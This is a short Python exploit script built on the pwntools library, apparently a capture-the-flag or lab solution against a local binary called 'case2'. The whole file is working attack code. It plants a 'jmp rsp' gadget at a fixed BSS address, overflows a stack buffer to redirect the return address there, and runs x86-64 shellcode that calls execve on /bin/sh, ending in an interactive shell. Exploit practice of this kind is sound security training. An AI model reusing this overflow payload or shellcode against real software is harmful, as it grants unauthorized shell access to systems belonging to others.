from pwn import *

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

bss_addr = 0x404090
jmp_rsp = '\x90\x90\x90\x90\x90\xff\xe4'

if __name__ == "__main__":

#	p = process( "./case2" )
	p = remote( '127.0.0.1', 33046 )

	p.recvuntil( ": " )
	p.send( jmp_rsp + '\n' )

	p.recvuntil( ": " )

	payload = 'a' * 128 + 'b' * 8
	payload += p64( bss_addr )
	payload += '\x90' * 16
	payload += shellcode
	payload += '\x90' * 16

	p.send( payload + '\n' )

	p.interactive()
